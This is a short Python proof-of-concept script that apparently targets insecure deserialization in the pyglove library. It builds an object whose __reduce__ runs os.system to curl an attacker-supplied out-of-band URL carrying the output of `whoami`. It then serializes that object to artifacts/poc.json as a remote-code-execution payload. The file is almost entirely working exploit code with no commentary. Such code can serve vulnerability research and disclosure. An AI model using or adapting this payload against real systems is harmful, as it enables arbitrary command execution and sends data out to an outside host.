import json
import os
from pathlib import Path
import pyglove as pg

oob = os.environ.get("OOB_URL")
prefix = "http://"
suffix = "?poc=`whoami`"

class pocRCE:
    def __reduce__(self):
        return (os.system, ("curl " + prefix + oob + suffix,))

def main():
    Path("artifacts").mkdir(parents=True, exist_ok=True)

    obj = pocRCE()

    j = pg.to_json(obj)

    out = Path("artifacts/poc.json")
    out.write_text(json.dumps(j, indent=2) + "\n", encoding="utf-8")
    print(f"Wrote {out.as_posix()}")

if __name__ == "__main__":
    main()